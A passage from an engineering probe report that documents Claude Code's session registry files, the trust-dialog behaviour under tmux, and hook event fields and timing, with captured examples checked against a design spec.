2026-09-14 live fork covers a live target without it; the combination was not attempted.


### `~/.claude.json` — `projects[<cwd>]` (trust and last-session fields)

- **Produced by:** Claude Code 2.1.270
- **Consumed by:** §13 trust posture, attached-session discovery (§8 line 926), M1
- **Probe:** `docs/probes/2026-09-14-schemas/transcripts/probe_claude_json.py` (read-only). Re-run: `python3 docs/probes/2026-09-14-schemas/transcripts/probe_claude_json.py`
- **Status:** verified live 2026-09-14 (field names and types. Values shown only for the probe's own throwaway project)

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/transcripts/captures/claude-json-shape.txt`)
```text
claude_version: 2.1.270 (Claude Code)
## projects: object keyed by absolute cwd path; 11 entries
## per-project fields (name: types, present in N of 11 entries)
  allowedTools: array  11
  ...
  hasTrustDialogAccepted: bool  11
  ...
  lastGracefulShutdown: bool  11
  ...
  lastSessionId: string  9
  ...
  lastVersionBase: string  11
  ...
## hasTrustDialogAccepted value counts: {(True,): 9, (False,): 2}
## entries for throwaway probe dirs (/tmp/shp-schemas-*), scalar values shown (our own sessions), arrays/objects typed only
  "/tmp/shp-schemas-regint.KD6xG3/work" {"allowedTools": "array(0)", "mcpContextUris": "array(0)", "mcpServers": "object(0 keys)", "enabledMcpjsonServers": "array(0)", "disabledMcpjsonServers": "array(0)", "hasTrustDialogAccepted": true, "hasClaudeMdExternalIncludesApproved": false, "hasClaudeMdExternalIncludesWarningShown": false, "lastGracefulShutdown": true, "lastVersionBase": "2.1.270", "lastCost": 0.031924600000000004, ... "lastSessionId": "2efd1f5f-1b93-481a-8469-0f589a48d7ae"}
```

| Field (`projects[<abs cwd>]`) | Type | Presence (of 11) | Observed values | Notes |
|---|---|---|---|---|
| key | string (absolute cwd) | — | raw path, not slugged | |
| `hasTrustDialogAccepted` | bool | always | true 9, false 2 | Set to true by accepting the dialog (probe) |
| `hasClaudeMdExternalIncludesApproved`, `hasClaudeMdExternalIncludesWarningShown` | bool | always | | |
| `allowedTools`, `mcpContextUris`, `enabledMcpjsonServers`, `disabledMcpjsonServers` | array | always | | |
| `mcpServers` | object | always | | |
| `lastSessionId` | string | sometimes (9) | UUID of the most recent session in that cwd | When it is written was not captured. The regint throwaway's value equals its session id after exit |
| `lastGracefulShutdown` | bool | always | | |
| `lastVersionBase` | string | always | `2.1.270` | |
| `lastCost`, `lastDuration`, `lastAPIDuration`, `lastAPIDurationWithoutRetries`, `lastToolDuration`, `lastStartTime`, `lastLinesAdded`, `lastLinesRemoved`, `lastTotal{Input,Output,CacheCreationInput,CacheReadInput}Tokens`, `lastTotalWebSearchRequests` | number | sometimes (9) | | |
| `lastModelUsage` | object | sometimes (9) | | |
| `lastSessionMetrics` | object | sometimes (4) | | |
| `lastFpsAverage`, `lastFpsLow1Pct` | number | sometimes (8) | | Interactive rendering |
| `exampleFiles`, `exampleFilesGeneratedAt`, `hasUnseenTeamArtifacts` | array / number / bool | sometimes (2/1/2) | | |

Top level: 62 keys, including `projects`, `oauthAccount` (object, 20 keys; sensitive), `userID`, `machineID`, `numStartups`, `hasUsedRemoteControl` (full list in the capture).

**Variants and edge cases:** **`-p` sessions create no `projects[]` entry**. The capture lists only 3 `/tmp/shp-schemas-*` entries, and each is a cwd where an interactive throwaway ran (regint and the two fork targets). The `-p`-only cwds (`/tmp/shp-schemas-tx.*`, `/tmp/shp-schemas-slug.*`, `/tmp/shp-schemas-reg.*`) have none; `-p` skips the trust dialog. Whether a declined trust dialog adds an entry is not in any capture. `lastSessionId` holds only one id per cwd.

**Spec alignment:** the spec does not reference `~/.claude.json`. Discovery must not rely on it, because it misses every `-p` session and keeps one id per cwd.

### Live-session registry `~/.claude/sessions/<pid>.json`

- **Produced by:** Claude Code 2.1.270 (interactive sessions only)
- **Consumed by:** §8 attached-session registration (lines 926–927), D1 attached sessions, §12 fleet (`needs_you`, running), M1
- **Probe:** `docs/probes/2026-09-14-schemas/transcripts/probe_registry_interactive.sh` and `docs/probes/2026-09-14-schemas/transcripts/probe_registry.sh` (`-p` negative), plus `docs/probes/2026-09-14-schemas/transcripts/stats_registry.py`. Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_registry_interactive.sh`
- **Status:** partially verified. The interactive file shape and the `idle`/`busy` lifecycle were verified live 2026-09-14. `waiting` / `waitingFor` are a user-data shape only, and the `-p` negative is inconclusive (see below).

**Real example** (full capture: `docs/probes/2026-09-14-schemas/transcripts/captures/regint-registry-busy.json`)
```json
{
    "pid": 4033805,
    "sessionId": "2efd1f5f-1b93-481a-8469-0f589a48d7ae",
    "cwd": "/tmp/shp-schemas-regint.KD6xG3/work",
    "startedAt": 1789398970793,
    "procStart": "543621664",
    "version": "2.1.270",
    "peerProtocol": 1,
    "peerFeatures": [
        "notify_idle",
        "reply_across_default_dirs",
        "artifact_yield"
    ],
    "kind": "interactive",
    "entrypoint": "cli",
    "pidDomain": "linux:64835ff781b0486f95b67b152a8cf404:pid:[4026531836]",
    "tmux": "probe:@0.%0",
    "messagingSocketPath": "/run/user/0/cc-socks/4033805.sock",
    "name": "shp regint probe",
    "nameSource": "user",
    "nameSince": 1789398970794,
    "updatedAt": 1789398977680,
    "status": "busy",
    "statusUpdatedAt": 1789398977680,
    "bridgeSessionId": "session_01RmL9HDvfCZ5Wrrfpr2mM4x"
}
```

| Field | Type | Presence (4 user files + probe) | Observed values | Notes |
|---|---|---|---|---|
| `pid` | number | always | = file name | |
| `sessionId`, `cwd` | string | always | | |
| `startedAt`, `updatedAt`, `statusUpdatedAt`, `nameSince` | number (epoch ms) | always | | |
| `procStart` | string | always | | Process start ticks, which guard against pid reuse |
| `version` | string | always | `2.1.270` 3, `2.1.269` 1 | |
| `kind` | string | always | `interactive` | |
| `entrypoint` | string | always | `cli` | |
| `status` | string | always | `idle`, `busy`, `waiting` | Changed idle → busy → idle during the probe turn |
| `waitingFor` | string | sometimes (1 user, with `status:waiting`) | `<redacted>` | |
| `name`, `nameSource` | string | always | `nameSource`: `user` (`--name`), `derived` (user's RC sessions) | |
| `peerProtocol`, `peerFeatures` | number / array | always | 1; `notify_idle`, `reply_across_default_dirs`, `artifact_yield` | |
| `pidDomain` | string | always | `linux:<hex>:pid:[<ns inode>]` | |
| `messagingSocketPath` | string | always | `/run/user/0/cc-socks/<pid>.sock` | |
| `tmux` | string | sometimes (3/4 user; probe) | `<session>:@<window>.%<pane>` | Present when launched inside tmux |
| `bridgeSessionId` | string | sometimes (3/4) | `session_…` | Remote Control |
| sibling `<pid>.<64 hex>.key` | file (mode 0600) | always | not read | Contains a peer token. Never read it |

**Variants and edge cases:**
- The file appears only **after the trust dialog is accepted**. During the dialog there was no file (`docs/probes/2026-09-14-schemas/transcripts/captures/regint-meta.txt`: `startup registry_file: none`).
- The file is **deleted on exit** (`after_exit registry_file: none`).
- **`-p` sessions: not verified.** `docs/probes/2026-09-14-schemas/transcripts/captures/registry-meta.txt` shows `registry_file:` empty, but the check ran about 15 s after launch. The `-p` model had its `sleep 40` blocked and backgrounded, and its last transcript entry is at 15:14:30.270Z, about 9 s after launch (`docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-reg-Jv4MTo-work/ea5a5348-….jsonl`). The process may already have exited when the registry was read. Absence during a live `-p` turn still needs a probe that confirms the pid is alive at check time.

**Spec alignment:** spec lines 926–927 say a hand-launched session "registers itself on its first turn with no filesystem polling" via `SessionStart`. That is an omission more than a contradiction. `SessionStart` can only register sessions started after hooks are installed. Sessions already running at install time have already passed `SessionStart`. Whether they pick up newly installed hooks on their next event was **not probed**. `~/.claude/sessions/<pid>.json` lists interactive sessions with `sessionId`, `cwd`, `status` and `tmux` pane, and the spec does not mention this source (`docs/probes/2026-09-14-schemas/transcripts/captures/regint-registry-busy.json`, `docs/probes/2026-09-14-schemas/transcripts/captures/regint-meta.txt`, `docs/probes/2026-09-14-schemas/transcripts/captures/registry-stats.json`).

### `claude agents --json`

- **Produced by:** Claude Code 2.1.270 (`claude agents --json [--all] [--cwd <path>]`)
- **Consumed by:** candidate discovery source for attached sessions (§8 line 926, D1), M1
- **Probe:** `docs/probes/2026-09-14-schemas/transcripts/probe_registry_interactive.sh` (own entry) and `docs/probes/2026-09-14-schemas/transcripts/probe_registry.sh` (other entries as redacted shapes, `-p` negative). Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_registry_interactive.sh`
- **Status:** partially verified. Entries for an interactive session (`idle`/`busy`) were verified live 2026-09-14. `waiting`, `--bg` sessions and `-p` absence are not verified.

**Real example** (full capture: `docs/probes/2026-09-14-schemas/transcripts/captures/regint-agents-busy.json`; the other entries are redacted shapes in `docs/probes/2026-09-14-schemas/transcripts/captures/agents-json-others-shape.json`)
```json
{
 "total_entries": 6,
 "own": [
  {
   "pid": 4033805,
   "cwd": "/tmp/shp-schemas-regint.KD6xG3/work",
   "kind": "interactive",
   "startedAt": 1789398970793,
   "sessionId": "2efd1f5f-1b93-481a-8469-0f589a48d7ae",
   "name": "shp regint probe",
   "status": "busy"
  }
 ]
}
```
(`total_entries` and `own` are the probe's wrapper. The CLI prints a bare JSON array of these objects.)

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `pid` | number | always | | |
| `cwd` | string | always | raw path | |
| `kind` | string | always | `interactive` (all observed) | Other kinds (e.g. background sessions) are not captured; no help-text capture exists |
| `startedAt` | number (epoch ms) | always | | |
| `sessionId` | string | always | | |
| `name` | string | always (observed) | | |
| `status` | string | always | `idle`, `busy`, `waiting` | Same values as the registry file |
| `waitingFor` | string | sometimes | `<redacted>` (1 user entry, status `waiting`) | |

**Variants and edge cases:**
- It is a projection of `~/.claude/sessions/<pid>.json`. It lacks `tmux`, `procStart`, `nameSource`, `bridgeSessionId` and `messagingSocketPath`.
- `-p` sessions: the one check (`docs/probes/2026-09-14-schemas/transcripts/captures/agents-json-own.json`, `"own": []`) is inconclusive, for the same timing reason as the registry `-p` check.
- `--all` returned the same entries (no completed background sessions existed).
- Exit code 0, no stderr, no TTY needed.
- Background (`--bg`) sessions were not probed (see not verified).

**Spec alignment:** not referenced by the spec. It is a supported CLI contract that could replace reading registry files, but it forks a `claude` process per poll and omits the `tmux` pane.

## Surface: interactive Claude Code (TUI) under tmux

**Surface:** `tmux-tui`. **Source:** `docs/probes/2026-09-14-schemas/tmux-tui/SECTION.md`. Paths that do not start with `docs/` or `/` are relative to `docs/probes/2026-09-14-schemas/tmux-tui/` (or to the capture folder named in the same caption).

All captures on this surface were made on 2026-09-14 with `claude --version` = `2.1.270 (Claude Code)` and `tmux 3.4`, Linux 6.8. Each capture folder has a `versions.txt`.

**Evidence folder:** `docs/probes/2026-09-14-schemas/tmux-tui/`

| Folder | Script (re-run from repo root) | What it covers |
|---|---|---|
| `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/` | `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py` | trust dialog, hooks, idle/permission, send-keys, resize, /rename, /compact, fork, /exit, SIGTERM, kill-session |
| `docs/probes/2026-09-14-schemas/tmux-tui/supp-20260914T155346Z/` | `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui_supp.py` | `--name`/`--session-id` at spawn, `capture-pane -S -2000` on the alternate screen, `pipe-pane` |
| `docs/probes/2026-09-14-schemas/tmux-tui/supp2-20260914T155625Z/` | `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui_supp2.py` | prompt-suggestion ghost text plus a bare Enter; text typed into a permission dialog |
| `docs/probes/2026-09-14-schemas/tmux-tui/supp3-20260914T160052Z/` | `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui_supp3.py` | typing a message over ghost text |
| `docs/probes/2026-09-14-schemas/tmux-tui/headless-20260914T160308Z/` | `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_headless_parity.py` | the same scenarios with `claude -p`, for the parity table |

Helpers: `docs/probes/2026-09-14-schemas/tmux-tui/capture_hook.sh` is the hook command. It appends the raw stdin plus the event name, our UTC timestamp, the claude pid and the process ancestry. `docs/probes/2026-09-14-schemas/tmux-tui/make_settings.py` writes throwaway settings that register all 33 events, set `enabledPlugins: {"cc10x@cc10x": false}` and set `remoteControlAtStartup: false`. `docs/probes/2026-09-14-schemas/tmux-tui/field_matrix.py`, `docs/probes/2026-09-14-schemas/tmux-tui/count_events.py` and `docs/probes/2026-09-14-schemas/tmux-tui/analyze_fork.py` are the analysis scripts.

**Probe hygiene (applies to every block below).**
- Every tmux call passed `-L shepherd-probe`, and teardown was `tmux -L shepherd-probe kill-server`. Proof: `*/teardown.txt` says "no server running on /tmp/tmux-0/shepherd-probe".
- The tmux server was started under `env -i`, so the probe sessions did not inherit `$TMUX` or `CLAUDECODE`.
- cc10x hooks did not fire. The debug log shows `Read hooks.json for plugin cc10x (enabled=false; will NOT register, plugin is disabled)` and `Registered 0 hooks from 0 plugins` (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/debug-a.log`), and every hook captured from a TUI session has `_ancestry` `capture_hook.sh → sh → claude → tmux: server`. Headless captures (`docs/probes/2026-09-14-schemas/tmux-tui/headless-20260914T160308Z/hooks-h.jsonl`) show `capture_hook.sh → sh → claude → python3 → timeout → ...` instead.
- Privacy (audit): the machine's host name and `/etc/machine-id` value appear in some captures (`pane_title` before the TUI starts, sidecar `pidDomain`). They are host identifiers, not session content, and are shown as `<redacted: ...>` in the examples below.
- An exploratory run done before the scripted one left Remote Control at its default (on), and the sidecar then carried a `bridgeSessionId`. That run was discarded and is not cited. The scripted runs set `remoteControlAtStartup: false`, and no `bridgeSessionId` appears in their sidecars.
- Privacy: every example below comes from throwaway sessions in `/tmp/shp-tui-*` directories. None of the user's transcripts were read.

---

### Workspace-trust dialog (TUI, tmux capture-pane)

- **Produced by:** Claude Code 2.1.270, interactive mode, first launch in a directory that has no trust entry
- **Consumed by:** §9 LocalRunner spawn (D14), §8 `state = starting` rule (line 940), M3. It also affects every owned spawn into a new worktree (M5)
- **Probe:** `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py` (steps 1, 1b). Re-run: `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/01-trust-dialog.txt`)
```text
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 Accessing workspace:

 /tmp/shp-tui-A-4tvrx00n

 Quick safety check: Is this a project you created or one you trust? (Like your own code, a well-known open source project, or work from your team). If not,
 take a moment to review what's in this folder first.

 Claude Code'll be able to read, edit, and execute files here.

 Security guide

 ❯ No, exit
   Yes, I trust this folder

 Enter to confirm · Esc to cancel
```
ANSI form (`capture-pane -e -p` rendered through `cat -v`; full capture: `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/01-trust-dialog.ansi.cat-v.txt`):
```text
^[[39m ^[[1m^[[38;5;220mAccessing^[[0m ^[[1m^[[38;5;220mworkspace:^[[0m
...
 ^[[38;5;246m^[]8;id=zaxmda;https://code.claude.com/docs/en/security^[\Security guide^[[39m^[]8;;^[\

 ^[[38;5;153mM-bM-^]M-/^[[39m ^[[38;5;153mNo,^[[39m ^[[38;5;153mexit^[[39m
   Yes, I trust this folder
```
Pane state while the dialog is shown (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/01-trust-dialog-fmt.txt`) and hook counts (`01-hooks-before-trust.txt`):
```text
alternate_on=0 pane_pid=4041880 pane_dead=0 pane_title=<redacted: host name> cursor=1,13
after >=15s on the trust dialog: hooks-a lines=0 (project settings), hooks-b lines=0 (--settings)
```
Refusing the dialog (Enter on the default) in `probe_b`, whose hooks came from `--settings` (`01b-list-sessions-after-refuse.txt`, `debug-b.log`):
```text
probe_b|4041912|1|1||0|160x45|
2026-09-14T15:50:07.444Z [DEBUG] Skipping SessionEnd:other hook execution - workspace trust not accepted
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| header line | text | always | `Accessing workspace:` | bold, SGR `38;5;220` |
| path line | text | always | the cwd | bold |
| question | text | always | `Quick safety check: Is this a project you created or one you trust?...` | a stable substring to detect the dialog |
| option 1 | text | always | `No, exit` | **selected by default** (`❯`) |
| option 2 | text | always | `Yes, I trust this folder` | reached with `Down` |
| footer | text | always | `Enter to confirm · Esc to cancel` | |
| `#{alternate_on}` | 0/1 | always | `0` while the dialog is shown, `1` once the TUI starts | usable as a detector |
| `#{pane_title}` | string | always | the host name while the dialog is shown, then `✳ Claude Code` | see the tmux formats block |
| sidecar `~/.claude/sessions/<pid>.json` | file | never observed during the dialog | `<absent: ...>` | `01-trust-dialog-sidecar.json` |

**Variants and edge cases:**
- Accepting takes `send-keys Down` then `send-keys Enter`. Output: `01c-trust-yes-selected.txt` shows `❯ Yes, I trust this folder`. `SessionStart` (`source: startup`) then fired (`hooks-a.jsonl` line 1).
- A bare Enter picks "No, exit". The process exits with **status 1** (`pane_dead_status` = 1).
- No hook fires before trust is accepted. This held for hooks in project `.claude/settings.json` (dirA) and for hooks passed with `--settings` (dirB): 0 lines each after at least 15 s. On refusal Claude Code logs that it skipped `SessionEnd:other` hook execution, so a refused spawn emits no hook at all.
- Once accepted, trust persists. Later spawns into the same directory (`probe_fork`, `probe_sig`) showed no dialog.
- `claude -p` in a fresh untrusted directory did not stop on a dialog, and hooks fired (`docs/probes/2026-09-14-schemas/tmux-tui/headless-20260914T160308Z/event-sequence.txt`).
- Not verified: what `Esc` does on this dialog.

**Spec alignment:**
- Spec line 940 says `starting` holds "until the first signal of any kind arrives, or `SPAWN_TIMEOUT_S` (60) elapses → then `stopped` / `crashed`". In reality an owned TUI spawn into an untrusted directory sends **no hook and writes no sidecar** until a human answers (observed for at least 15 s; the full 60 s was not waited out). It does draw the dialog on the pty. Line 939 counts "pty output" as a `running` signal, so depending on how "signal of any kind" is read, the session is mislabelled either `running` (because of the dialog's pty output) or `stopped`/`crashed` after 60 s. It is never recognised as blocked on a human. A runner that sends a bare Enter exits the process with status 1. Evidence: `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/01-hooks-before-trust.txt` and `01b-list-sessions-after-refuse.txt`.
- §9 (lines 1131–1145) and §18 (line 2325) never mention the trust dialog. The detector has to be pane text plus `alternate_on=0`, not a hook. (evidence as above)

---

### Hook event parity: interactive TUI versus headless `-p`

- **Produced by:** Claude Code 2.1.270. The TUI ran in tmux 3.4; headless used `claude -p --output-format json`.
- **Consumed by:** §8 event table (lines 877–889), the needs-you/stop rules (lines 935–970), §9 mailbox trigger (line 1181), D12, D24, M1 (hookd), M3 (owned sessions)
- **Probe:** `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py` + `docs/probes/2026-09-14-schemas/tmux-tui/probe_headless_parity.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py && python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_headless_parity.py`
- **Status:** partially verified. The scenarios in the table were verified live 2026-09-14; the many events that were registered but never provoked are listed under "not verified".

**Real example** (TUI event sequence for one session; full capture: `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/hooks-a-event-sequence.txt`)
```text
2026-09-14T15:50:12.998Z 71757dd1 SessionStart startup
2026-09-14T15:50:16.536Z 71757dd1 UserPromptSubmit 
2026-09-14T15:50:17.936Z 71757dd1 MessageDisplay 
2026-09-14T15:50:17.949Z 71757dd1 Stop 
2026-09-14T15:50:21.495Z 71757dd1 SubagentStop 
2026-09-14T15:51:17.976Z 71757dd1 Notification idle_prompt
2026-09-14T15:51:20.122Z 71757dd1 UserPromptSubmit 
2026-09-14T15:51:21.462Z 71757dd1 MessageDisplay 
2026-09-14T15:51:21.468Z 71757dd1 Stop 
2026-09-14T15:51:23.681Z 71757dd1 UserPromptSubmit 
2026-09-14T15:51:25.466Z 71757dd1 PreToolUse 
2026-09-14T15:51:25.526Z 71757dd1 PermissionRequest 
2026-09-14T15:51:31.548Z 71757dd1 Notification permission_prompt
2026-09-14T15:51:31.789Z 71757dd1 PostToolUse 
2026-09-14T15:51:31.801Z 71757dd1 PostToolBatch 
2026-09-14T15:51:33.535Z 71757dd1 MessageDisplay 
2026-09-14T15:51:33.561Z 71757dd1 Stop 
2026-09-14T15:51:34.747Z 71757dd1 UserPromptSubmit 
2026-09-14T15:51:38.746Z 71757dd1 PreToolUse 
2026-09-14T15:51:41.247Z 71757dd1 UserPromptSubmit 
2026-09-14T15:51:50.815Z 71757dd1 PostToolUse 
2026-09-14T15:51:50.834Z 71757dd1 PostToolBatch 
2026-09-14T15:51:53.806Z 71757dd1 MessageDisplay 
2026-09-14T15:51:53.811Z 71757dd1 Stop 
2026-09-14T15:52:00.594Z 71757dd1 SubagentStop 
2026-09-14T15:52:51.987Z 71757dd1 PreCompact manual
2026-09-14T15:53:06.477Z 71757dd1 SubagentStop 
2026-09-14T15:53:06.512Z 71757dd1 SessionStart compact
2026-09-14T15:53:06.523Z 71757dd1 PostCompact manual
...
2026-09-14T15:53:33.685Z 71757dd1 SessionEnd other
```
Headless counterpart (`docs/probes/2026-09-14-schemas/tmux-tui/headless-20260914T160308Z/event-sequence.txt`):
```text
== h1_pong
  2026-09-14T16:03:08.588Z 55b21a24 SessionStart startup 
  2026-09-14T16:03:09.459Z 55b21a24 UserPromptSubmit  
  2026-09-14T16:03:10.522Z 55b21a24 MessageDisplay  
  2026-09-14T16:03:10.582Z 55b21a24 Stop  
  2026-09-14T16:03:10.612Z 55b21a24 SessionEnd other 
== h2_permission_default_mode
  2026-09-14T16:03:11.893Z 55b21a24 SessionStart resume 
  2026-09-14T16:03:12.347Z 55b21a24 UserPromptSubmit  
  2026-09-14T16:03:14.061Z 55b21a24 PreToolUse Bash 
  2026-09-14T16:03:14.092Z 55b21a24 PermissionRequest Bash 
  2026-09-14T16:03:14.111Z 55b21a24 PostToolBatch  
  2026-09-14T16:03:17.656Z 55b21a24 MessageDisplay  
  2026-09-14T16:03:17.724Z 55b21a24 Stop  
...
```

| Scenario | TUI (tmux) events | Headless `-p` events | Notes |
|---|---|---|---|
| launch | `SessionStart{source:startup}` only after trust | `SessionStart{startup}` | TUI: no hooks before trust |
| prompt → answer | `UserPromptSubmit`, `MessageDisplay`, `Stop`, then `SubagentStop{agent_type:""}` 3–7 s later | `UserPromptSubmit`, `MessageDisplay`, `Stop`, `SessionEnd{other}` | the trailing `SubagentStop` is TUI-only, with no `SubagentStart` (prompt-suggestion helper) |
| idle at prompt | `Notification{idle_prompt}` **60.03 s** after `Stop` (`04-idle-delay.txt`) | none (process exits) | one per idle period observed |
| tool needs permission | `PreToolUse`, `PermissionRequest`, then `Notification{permission_prompt}` **6.02 s** later if still unanswered (`06-permission-delay.txt`); after approval `PostToolUse`, `PostToolBatch` | `PreToolUse`, `PermissionRequest`, `PostToolBatch`; the call is auto-denied and listed in stdout `permission_denials` | no `PermissionDenied` or `PostToolUseFailure` in headless |
| permission answered < 6 s | `PermissionRequest` then `PostToolUse`, **no Notification** (4 prompts, `docs/probes/2026-09-14-schemas/tmux-tui/event-counts.txt`) | n/a | |
| message typed while running | `UserPromptSubmit` fires **immediately**, mid-turn, carrying the running turn's `prompt_id`; still **one** `Stop` | n/a | see the send-keys block |
| `/compact` | `PreCompact{manual}`, `SubagentStop`, `SessionStart{compact}`, `PostCompact{manual}` | `SessionStart{resume}`, `PreCompact{manual}`, `SubagentStop`, `SessionStart{compact}`, `PostCompact{manual}`, `SessionEnd{other}` | same order; `SessionStart{compact}` comes before `PostCompact` |
| `/rename` | **no hook** (`10-rename-hooks.txt`: `[]`) | `SessionStart{resume}`, `SessionEnd{other}` | the title shows up later as `session_title` |
| fork | `SessionStart{source:fork}` with a new `session_id` | same | |
| `/exit` | `SessionEnd{reason:prompt_input_exit}` | n/a (`-p` ends with `other`) | |
| tmux `kill-session` | `SessionEnd{reason:other}` 24 ms after the kill | n/a | fired even though the pty disappeared |
| `kill -TERM <claude pid>` | `SessionEnd{reason:other}`, `pane_dead_status` 143 | n/a | |

**Variants and edge cases:**
- `SubagentStop` arrived with no matching `SubagentStart` 10 times across 4 TUI captures, and `SubagentStart` arrived 0 times (`docs/probes/2026-09-14-schemas/tmux-tui/event-counts.txt`). `agent_type` was `""` and `last_assistant_message` was `"(silence)"` or the compact summary. These come from Claude Code's internal helpers: prompt suggestion and the compaction summarizer.
- `MessageDisplay` streams: 12 events about 100 ms apart for one 80-line reply (`docs/probes/2026-09-14-schemas/tmux-tui/supp-20260914T155346Z/05-hook-sequence.txt`).
- In the TUI, `/compact` prints each hook's command line with "completed successfully" into the pane (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/11-compact-after.txt`). That is pane noise, not hook data.
- No payload in any capture had an `effort` key (`docs/probes/2026-09-14-schemas/tmux-tui/event-counts.txt`, `field-matrix-a-and-supp.txt`).
- Not verified (not provoked on this surface): `StopFailure`, `PostToolUseFailure`, `PermissionDenied`, `Elicitation*`, `SubagentStart`, `TaskCreated`/`TaskCompleted`, `FileChanged`, `CwdChanged`, `Pre/PostModelSwitch`, `ConfigChange`, `InstructionsLoaded`, `Worktree*`, `TeammateIdle`, `Setup`, `DirectoryAdded`, `UserPromptExpansion`, `PreCompact{auto}`, `SessionEnd{clear|logout|resume}`. All 33 were registered. Only the events in the table fired.

**Spec alignment:**
- Spec line 885 maps `SubagentStart` / `SubagentStop` to `active_subagents`. In the TUI, `SubagentStop` fires after most turns and after `/compact` with no `SubagentStart`, so a counter goes negative (`docs/probes/2026-09-14-schemas/tmux-tui/event-counts.txt`, `field-matrix-a-and-supp.txt`).
- Spec line 937 counts `idle_prompt` as `needs_you` and "`needs_you` outranks `stopped`". Every idle TUI session therefore flips from `stopped` to `needs_you` 60.03 s after `Stop` (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/04-idle-delay.txt`; seen again in `supp2`). This follows the spec's rule literally, but the spec names neither the delay nor the consequence: every finished interactive session ends up in the Needs-You rail after a minute.
- Spec line 883 uses `Notification` / `PermissionRequest` for `needs_you`. `PermissionRequest` is the only prompt signal when the human answers within about 6 s. `permission_prompt` is delayed 6 s and sometimes never comes (`docs/probes/2026-09-14-schemas/tmux-tui/event-counts.txt`).
- Spec line 937 needs "an unresolved `PermissionRequest`". No explicit resolution event was observed on approval, and `PermissionRequest` has **no `tool_use_id`** (the preceding `PreToolUse` and the following `PostToolUse` do). Resolution on approval must be inferred from the next `PostToolUse` with the same `prompt_id` and `tool_name` (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/hooks-a.jsonl` lines 11–14). Denial ("3. No") was never chosen, so whether `PermissionDenied` marks that case is not verified.
- Spec line 929 lists `prompt_id`, `permission_mode` and `effort.level` as common fields. `permission_mode` is absent from `SessionStart`, `Notification`, `Pre/PostCompact`, `SessionEnd` and `MessageDisplay`; `effort` appears nowhere; `prompt_id` is absent from `SessionStart{startup|fork}` and from a `SessionEnd` with no prior prompt (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/field-matrix-a-and-supp.txt`, `hooks-a.jsonl` lines 1, 30, 36). Every TUI payload carries `scratchpad_dir`, which the spec does not list; headless `-p` payloads (`docs/probes/2026-09-14-schemas/tmux-tui/headless-20260914T160308Z/hooks-h.jsonl`) carry none.
- Spec lines 967–970 use `SessionEnd.end_reason`; the key is `reason` (`field-matrix-a-and-supp.txt`). Spec lines 962–963 use `Stop.stop_reason`; none of the 13 `Stop` payloads in the four TUI captures has that key (keys observed: `background_tasks`, `last_assistant_message`, `session_crons`, `stop_hook_active`). All were ordinary end-of-turn stops, though; the `tool_use`/`max_tokens` cases were not provoked, so this is "not observed", not a proven absence.
- Spec lines 964–965 (`crashed` / `killed`). The SIGTERM'd session (`probe_sig`, never prompted) emitted `SessionStart` then `SessionEnd{other}` and exited 143 with **no** `Stop`, so it matches the literal `crashed` rule. The spec's `killed` row (from `action_log`) covers it only if `killed` is evaluated before `crashed`, and the spec does not state that order. `kill-session` also emits `SessionEnd{other}`, and `other` has no row in the stop-reason table (`docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/14-hooks-after-sigterm.txt`, `15-hooks-after-kill.txt`).
- Spec line 1181 (mailbox triggers on `Stop`): aligned. `Stop` fires in the TUI at the end of every turn, including a turn that absorbed a mid-turn message.

---

### Notification payload (TUI: idle_prompt, permission_prompt)

- **Produced by:** Claude Code 2.1.270, interactive
- **Consumed by:** §8 lines 883, 937, 945–947; Needs-You rail §12; M1 (ingest), M2 (rail)
- **Probe:** `docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py` steps 3 and 4. Re-run: `python3 docs/probes/2026-09-14-schemas/tmux-tui/probe_tui.py`
- **Status:** partially verified. The payload was verified live 2026-09-14 for `idle_prompt` and `permission_prompt` only; the other `notification_type` values the spec relies on (line 937: `agent_needs_input`, `elicitation_dialog`, `elicitation_url_dialog`; line 957: the `quota_auto_resume_*` values) were not provoked.

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/tmux-tui/run-20260914T154946Z/hooks-a.jsonl` lines 6 and 13)
```json
